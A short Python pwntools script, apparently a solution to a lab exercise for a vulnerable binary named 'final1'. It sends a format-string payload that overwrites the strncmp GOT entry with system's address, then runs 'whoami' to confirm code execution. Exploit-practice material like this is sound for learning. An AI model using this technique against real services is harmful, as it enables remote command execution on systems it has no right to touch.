#!/usr/bin/python3
from pwn import *
# logins are saved to /var/log/syslog
c = remote('172.16.17.27', 2994)
print(c.recvuntil(b'$').decode('utf-8'))
# system is 0xb7ec  ffb0
# using gdb `pidof final1` and
# info functions strncmp
# we get the GOT offset
strncmp_got = p32(0x804a1a8)
snd_half = p32(0x804a1aa)
username = b'username '+strncmp_got+snd_half+b'%65412x%16$n%47164x%17$n'
print(b'Sent '+username)
c.sendline(username)
print(c.recv().decode('utf-8'))
login = b'login p'
c.sendline(login)
print(b'Sent '+login)
for i in range(2):
    print(c.recv().decode('utf-8'))
username = b'whoami'
c.sendline(username)
print(b'Sent '+username)
for i in range(2):
    print(c.recv().decode('utf-8'))
c.close()
